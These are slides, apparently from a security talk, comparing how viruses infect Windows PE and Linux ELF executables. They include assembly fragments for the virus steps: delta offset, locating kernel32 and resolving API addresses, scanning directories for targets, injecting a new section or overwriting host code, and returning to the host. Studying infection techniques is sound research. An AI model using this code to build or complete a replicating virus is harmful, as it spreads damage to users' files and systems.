Comparison Of File Infection On The 
Windows And Linux
lclee_vx / F-13 Labs, lychan25/F-13 Labs 
[www.f13-labs.net]
2
Overview
• Introduction
• What is Win32 and ELF32 ?
• The PE File Format and ELF File Format
• Win32 File Infection (Windows Platform) and ELF File Infection (Linux
   Platform)
• Demo
• Comments
• References
3
Introduction 
• A virus is a program that reproduces its own code by attaching itself to 
   other executable files in such a way that virus code is executed when the
   Infected executable file is executed. [Defined at Computer Knowledge 
   Virus Tutorial, @Computer Knowledge 2000]
• This section will introduce the common file infection strategy that 
   virus writers have used over the years on the Windows/Linux platform. 
4
Introduction: Win32 and ELF32
 Win32 refers to the Application Programming 
Interface (API) available in Windows Operating 
System
 ELF32 standard as a portable object file format 
that works on 32-bit Intel Architecture 
environments
5
Introduction: PE /ELF File Format
 What is Portable Executable (PE) file format?
- Microsoft’s format for 32-bit executables and object files 
(DLLs)
- compatible across 32-bit Windows operating systems
6
Introduction: PE /ELF File Format
 What is the Executable and Linking Format? 
• Part of the ABI
• Streamline software development
• Three main ELF object files. 
(Relocatable/Executable/Shared)
• Two views - Executable/Linking
7
Introduction: PE File Format
PE File Layout
8
Introduction: ELF File Format
ELF File Layout
Linking View
Execution View
Demonstration
PE File Infection
10
Demo 1 – PE File Infection
1. Get the delta offset
VirusStart:
call
Delta
Delta:
pop
ebp
mov
ebx, ebp ;ebx=ebp
sub
ebp, offset Delta
2. Get the 
Kernel32.dll address
GetK32
proc
push
eax
Step1:
dec
esi
mov
ax, [esi+3ch]
test
ax, 0f000h
jnz
Step1
cmp
esi, [esi+eax+34h]
jnz
Step1
pop
eax
ret
GetK32
endp
11
Demo 1 – PE File Infection
3. Scan Kernel32.dll and
    get the address of 
    others API function
- Scan KERNEL32.DLL and retrieve the address of other API 
functions with 
   Checksum
- Formula:
1. eax=Index into the address of Ordinals
2. Ordinal= eax*2+[AddressOfNameOrdinals]
3. Address of Functions (RVA)=Ordinal*4+[AddressOfFunctions]
4. Scan the target file
    in the current directory
DirectoryScan
proc
lea      eax, [ebp+offset CurtDirectory]
push    eax
push    max_path
mov    eax, dword ptr [ebp+offset 
aGetCurrentDirectoryA
call     eax
lea      eax, [ebp+offset CurtDirectory]
push    eax
mov    eax, dword ptr [ebp+offset 
aSetCurrentDirectoryA]
call     eax
mov    dword ptr [ebp+offset Counter], 3
call     SearchFiles
ret
DirectoryScan
endp
12
Demo 1 – PE File Infection
5. File Injection with adding
    the new section
- Get the File Attributes, File Handle of target file
- Allocate the specified bytes in the heap 
- Read the target file and mark the infected file with “chan”
  in [PE Header+4ch]
- Add the new section named “lych”
- Copy the virus body into new section
6. Copy the virus body 
into
    new section
7. Exit and return control 
    to the host file
13
Demo 1 – PE File Infection
Before PE File Infection
14
Demo 1 – PE File Infection
After PE File Infection
Demonstration
ELF File Infection 
16
Demo 2 – ELF File Infection
1. Get the delta offset
_start:
call
Delta
Delta:
pop
ebp
sub
ebp, Delta
2. Control access to a
    region of memory
mov
edx, 07h
mov
ecx, 04000h
lea
ebx, [ebp+_start]
and
ebx, 0FFFFF000h
call
SYS_mprotect
Note: All the Linux system call can access with int 80h 
17
Demo 2 – ELF File Infection
3. Scan the target file in 
    current directory
1. Check the file type
//-----------------------
mov
eax, dword [esi]
cmp
eax, 0x464C457F
          jne
near UnMap
2. Check the file Infected already?
//--------------
mov   eax, dword [ebp+_start]
cmp   dword [esi], eax
jz       UnMap
4. Check the file type 
    and infected 
    already?
18
Demo 2 – ELF File Infection
5. Enough space for Virus
    body 
1. Check the space for virus body
//----------------------------------
mov     eax, dword [edi+14h]
sub      
eax, ebx
mov     
ecx, VxEnd - _start
cmp     
eax, ecx
jb        near UnMap
6. Overwriting host code 
    by viral code
1. Get the value of 
    a. e_ehsize (elf header size)
    b. eh_entrypoint (entry point)
    c. eh_ph_count (ph number)
    d. eh_ph_entrysize (ph entry size)
2. e_entry < p_addr + p_memsz
3. Write the frame and virus 
19
Demo 2 – ELF File Infection
7. Exit and return to the 
    host program
1. UnMap the ELF file and return to the host program
Note:
The size of ELF file increase
20
Demo 2 – ELF File Infection
Before ELF File Infection
21
Demo 2 – ELF File Infection
After ELF File Infection
22
Conclusions
• The hard times of a Linux binary virus to infect ELF 
   executables and spread
• Task of propagation in Linux system is made much more
   difficult by the limited privileges of the user account
• Its more easier to access and get the Linux System call 
   with int 80h 
23
Reference
•Szor, Peter. Attacks on Win32. Virus Bulletin Conference, 
October 1998, Munich/Germany, page 57-84.
•Inside Windows: An In-Depth Look into the Win32 Portable 
Executable File Format: 
http://msdn.microsoft.com/msdnmag/issues/02/02/PE/defau
.
•Microsoft Portable Executable and Common Object File 
Format Specification: 
http://www.microsoft.com/whdc/system/platform/firmwa
re/PECOFF.mspx.
24
Reference
• Silvio Cesare, 1999. Unix Viruses
• Billy Belcebu, 1999. Viruses under Linux, Xine – Issue #5
• @Computer Knowledge 2000, 2000. Computer Knowledge
   Virus Tutorial
• http://www.f13-labs.net
• http://www.eof-project.net
•Many thanks go to moaphie,izee, skyout, synge,   
  robinh00d, Invizible etc
-Thank You –
PI:EMAIL
PI:EMAIL